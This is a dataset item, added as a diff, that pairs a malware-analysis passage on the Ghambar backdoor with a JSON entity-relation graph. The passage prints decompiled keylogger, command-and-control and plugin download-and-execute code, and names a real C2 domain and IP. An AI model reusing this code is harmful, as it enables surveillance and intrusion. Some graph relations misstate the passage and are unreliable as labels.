@@ -1,0 +1,277 @@
+
+
+
+Sentence : Ghambar Malware
+In December 2014, Cylance described a set of actors and tools, labelled “Operation Cleaver,” which
+differed from those campaigns associated with Flying Kitten and Rocket Kitten. Cleaver was described as
+a persistent campaign conducted over several years, targeting economic infrastructure, defense
+corporations and governments in the Middle East and elsewhere. According to the tools and techniques
+used in the campaigns, often centered on the development of a fictitious persona as a lure for employees
+of targeted companies, the Cleaver threat group was considerably more ambitious than other groups.
+While previous publication focused on espionage activities, the same personas and tools disclosed in
+reports on the groups arose in other incidents occurring at the same time that were targeted against
+religious minorities and foreign policy institutions focused on Iran. In our monitoring of activities similar
+to those of Cleaver over the course of two years, until at least June 2016, over sixty identified domain
+names targeted a more diverse set of institutions and nationalities, including: an Israeli advocacy
+organization, American foreign policy institutions, Saudi economic and governmental entities,
+international Iranian human rights organizations, the American and European defence industry base,
+activists mobilizing on Facebook from inside of Iran, and civil aviation companies. Based on
+commonalities between toolkits and targeting, we believe that it is the same group, although we also
+believe the structure of the organization has shifted over recent months.
+Included in these activities, we find indication of the development of a successor to malware agents
+developed by the Cleaver actors. Currently, we identify this malware family as “Ghambar,” due to the
+word being used in some function names and variables inside the same malware’s code; also subsequent
+samples expose potentially personally identifiable information and alternative names. While Ghambar
+does not seem to share any significant codebase with past tools, we believe that Ghambar might be the
+successor of TinyZBot, which is one of the artifacts described by Cylance in the Operation Cleaver report.
+Similar to TinyZBot, Ghambar is also developed in C# and it employs the same SOAP­based command
+and control protocol. While it is provided with fewer features, Ghambar appears better designed and with
+22
+Iran and the Soft War for Internet Dominance Guarnieri & Anderson
+a cleaner code style. The samples we obtained dates to November­December 2015 and late April 2016, 33
+representing distinct points in the development cycle of the agent.
+private static void Main()
+{
+try
+{
+Utils.DbgPrint(".: In the name of God :.");
+...
+Within the decompiled code we find references to Islam, with the first instruction on installation of the
+development version of Ghambar being the printing of the debug string of “In the name of God.” This
+feature is the shorten version of the phrase "In the name of God, the Most Gracious, the Most Merciful"
+( Bismillah ir­Rahman ir­Rahim ). The connotation of the phrase and its placement is notable, Bismallah is
+the introduction of most chapters of the Quran, and is commonly referenced within the political discourse
+of Muslim societies. Its inclusion in less public aspects of Cleaver’s operation may provide insight into
+the developers of Ghambar and their reasons for engaging in such campaigns. 34
+Ghambar’s use in the wild was directly observed in April 2016 when a number of human rights activists
+in the diaspora received invitations to a “Middle East Human rights Webinar” hosted by a small Spanish
+university. The Cleaver actors breached the main site of the university, believed to be achieved through
+the exploitation of a software vulnerability (a Nessus installation was found on a related
+attacker­maintained server). Using the valid Sender Policy Framework address, the actors were then able
+to send legitimate­appearing messages posing as the university that appeared to be invitations to an Adobe
+33 MSPavilion.exe ­ 00b5d45433391146ce98cd70a91bef08
+34 Or their sense of humor.
+23
+Iran and the Soft War for Internet Dominance Guarnieri & Anderson
+Connect webinar. The referenced conference information was then hosted on the university site, leading
+to valid links as well. Once on the page, and only if the user appeared to be on Windows, the page would
+trigger a warning about an Adobe Flash update. As common elsewhere, the downloaded installer would
+be a legitimate version of Flash bundled with Ghambar.
+Structure and Operations
+Ghambar is written in C# and appears distributed obfuscated with SmartAssembly. Using de4dot we can 35
+easily deobfuscate the code and with ILSpy decompile the binary to its original source code. Within the 36
+decompiled source code we quickly observe that the malware is provided with a debugging option in the
+case the file “ D:\Debug.Me ” is present:
+public static void DbgPrint(string log)
+{
+if (File.Exists("D:\Debug.Me"))
+{
+Debug.Write(log);
+}
+}
+By creating an empty file at that particular path, we can enable the logging which is helpful and
+interesting when monitoring an initial execution:
+35 http://de4dot.com/
+36 http://ilspy.net/
+24
+Iran and the Soft War for Internet Dominance Guarnieri & Anderson
+What the main function does is install the malware in the proper folder
+(“ %AppData%\Pavilion\MSPavilion.exe ”) and registers it in the Run registry key to gain persistence. The
+main function then finally launches a new instance of the newly copied executable. The new process, after
+invoking a self­explanatory and ambitious function called ManualSleepToBypassAv, will load the
+configuration from its own resources. An example of the deobfuscated configuration in included at
+Appendix “Ghambar Configuration.”
+If the configuration provides paths to either a JPG or a PDF file, the Ghambar will open them as decoy.
+The malware will then collect some basic information on the compromised system, instantiate a
+connection to the command and control, and register to it. Subsequently, it initializes a keylogger with the
+traditional SetWindowsHookEx technique, as well as a procedure to communicate and receive commands
+from the C&C:
+private static void IterativeRoutinsProc(ServiceManifest communicationChannel)
+{
+try
+{
+while (true)
+{
+25
+Iran and the Soft War for Internet Dominance Guarnieri & Anderson
+Utils.DbgPrint("CommandControlProc");
+CommandControlController.CommandControlProc(communicationChannel,
+Program.ConfigInfo.TargetId);
+Program.FileUploader.UploadAllOfflineFiles(communicationChannel,
+Program.ConfigInfo.TargetId);
+Utils.ManualSleepToBypassAv(30);
+Thread.Sleep(30000);
+Utils.HeyImOnline(Program._communication,
+Program.ConfigInfo.TargetId);
+}
+}
+catch (Exception ex)
+{
+Utils.DbgPrint(string.Format("EX : {0} Method : {1}", ex.Message,
+MethodBase.GetCurrentMethod().Name));
+}
+}
+As you can see from the procedure above, before the regular check­in with the C&C, the malware invokes
+Program.FileUploader.UploadAllOfflineFiles . Interestingly, Ghambar is designed to leave as little
+footprint on the system as possible. When collecting screenshots, clipboard data, and intercepted
+keystrokes, it attempts to directly send the data to the C&C without writing on disk. For example, we can
+observe this behavior in the following portion of code handling intercepted keystrokes data:
+private static void KeylogBufferArrived(string buffer)
+{
+if (!string.IsNullOrEmpty(buffer))
+{
+try
+{
+if (Utils.IsServerEndpointAvaliable())
+{
+bool flag;
+Program._communication.SendKeyLog(Program.ConfigInfo.TargetId,
+DateTime.Now, true, buffer, out flag, out Program._tempSpecified);
+}
+else
+{
+string keyloggerStoragePath =
+IoPathUtils.GetKeyloggerStoragePath();
+if (!Directory.Exists(keyloggerStoragePath))
+{
+Directory.CreateDirectory(keyloggerStoragePath);
+}
+string path = Path.Combine(keyloggerStoragePath,
+Path.GetRandomFileName());
+File.WriteAllText(path, buffer);
+}
+}
+catch (Exception ex)
+26
+Iran and the Soft War for Internet Dominance Guarnieri & Anderson
+{
+Utils.DbgPrint(string.Format("EX : {0} Method : {1}", ex.Message,
+MethodBase.GetCurrentMethod().Name));
+}
+}
+}
+In case the C&C is available, the data buffer is directly sent over, otherwise it is stored in a directory
+specified in the configuration properties. In the latter case, when at the next iteration
+UploadAllOfflineFiles is called, the files on disk will be deleted.
+While executing a parallel keylogger, Ghambar is also able to receive instructions from the C&C on
+additional tasks to execute. These tasks can be additional plugins to be downloaded and executed, generic
+tasks on the file system, or a number of predefined commands. Following is the portion of code
+responsible for fetching pending tasks for those three categories, Appendix “Ghambar Command Control”
+include the pertinent code.
+Ghambar is provided with a full­featured plugins system. If instructed to do so by the C&C, the malware
+is able to download, store, and execute any given plugin. In the following relevant snippet, you can also
+observe a mention to a __ghambarService_ .
+public void ProcessPlugins(T4[] plugins)
+{
+Utils.DbgPrint(MethodBase.GetCurrentMethod().Name);
+for (int i = 0; i < plugins.Length; i++)
+{
+T4 t = plugins[i];
+string text = CommandProcessor._ghambarService.DownloadPlugin(t.ID);
+if (!string.IsNullOrEmpty(text))
+{
+byte[] bytes = Convert.FromBase64String(text);
+string path = Path.Combine(IoPathUtils.GetPluginsPath(), t.ID);
+path = Path.ChangeExtension(path, t.FileFormat);
+if (!Directory.Exists(IoPathUtils.GetPluginsPath()))
+{
+Directory.CreateDirectory(IoPathUtils.GetPluginsPath());
+}
+File.WriteAllBytes(path, bytes);
+if (File.Exists(path))
+{
+bool isActive = PluginUtils.InstallPlugin(t);
+bool flag;
+bool flag2;
+CommandProcessor._ghambarService.SetPluginActiveState(this._targetId, t.ID,
+isActive, true, out flag, out flag2);
+}
+}
+27
+Iran and the Soft War for Internet Dominance Guarnieri & Anderson
+}
+}
+Other than generally creating, deleting and fetching files, Ghambar is also able to executed a number of
+predefined commands if instructed to do so by the C&C. The commands, identified by a command­type
+identifier, include the following:
+
+
+Self­destruct;
+
+
+Execute a command through cmd.exe and return output;
+
+
+Take a screenshot;
+
+
+Shutdown the computer;
+
+
+Restart the computer;
+
+
+Logoff the user;
+
+
+Lock the computer;
+
+
+Turn on and off the monitor;
+
+
+Set and copy clipboard data;
+
+
+Enable or disable mouse/keyboard (although these procedures are not yet implemented);
+
+
+“Enable or disable desktop” (not implemented);
+
+
+Trigger a BSOD (also, not implemented).
+
+
+While the sample we obtained might be an earlier stage still under development, Ghambar is already
+provided with enough features to make it a fully­functional backdoor.
+Infrastructure
+The Ghambar sample we obtained is configured to contact the domain nvidia­update.com . Prior to its
+lapse, the domain resolved to the IP address 85.17.172.180, hosted at Leaseweb in the Netherlands.
+Ghambar interacts with the server with a SOAP­based XML protocol on port 5050, with well defined
+structures and events that very granularly defines the processes of registering the compromised
+computers, fetch commands, and report their results. It doesn’t employ any encryption algorithm, it
+occasionally just compresses with zlib and encodes in base64 particularly large portions of data.
+Appendix “Ghambar Network” is a typical exchange between the compromised host and the command
+and control server, from initial registration to command fetching. For the sake of clarity, we broke down
+and formatted the content of the communication stream.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "Ghambar Malware", "type" : "EXEF"},
+        {"id": 2, "description": "Cleaver threat group", "type" : "ACTO"},
+        {"id": 3, "description": "TinyZBot", "type" : "EXEF"},
+        {"id": 4, "description": "Adobe Connect webinar invitation", "type" : "MAIL"},
+        {"id": 5, "description": "Spanish university's main site", "type" : "URLS"},
+        {"id": 6, "description": "Nessus installation on attacker-maintained server", "type" : "APPS"},
+        {"id": 7, "description": "Adobe Flash update installer", "type" : "EXEF"},
+        {"id": 8, "description": "D:\\Debug.Me", "type" : "SYSP"},
+        {"id": 9, "description": "%AppData%\\Pavilion\\MSPavilion.exe", "type" : "SYSP"},
+        {"id": 10, "description": "Run registry key", "type" : "REGI"},
+        {"id": 11, "description": "nvidia-update.com", "type" : "CCSH"},
+        {"id": 12, "description": "85.17.172.180", "type" : "CCSH"},
+        {"id": 13, "description": "SOAP-based XML protocol on port 5050", "type" : "NETP"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "developed by"},
+        {"source": 1, "target": 3, "rel_name" : "successor of"},
+        {"source": 4, "target": 5, "rel_name" : "sent from"},
+        {"source": 5, "target": 6, "rel_name" : "exploited by"},
+        {"source": 7, "target": 1, "rel_name" : "bundled with"},
+        {"source": 8, "target": 1, "rel_name" : "checks for"},
+        {"source": 9, "target": 1, "rel_name" : "installed as"},
+        {"source": 10, "target": 1, "rel_name" : "registered in"},
+        {"source": 11, "target": 1, "rel_name" : "communicates with"},
+        {"source": 12, "target": 11, "rel_name" : "hosts"},
+        {"source": 13, "target": 1, "rel_name" : "uses"}
+    ]
+}
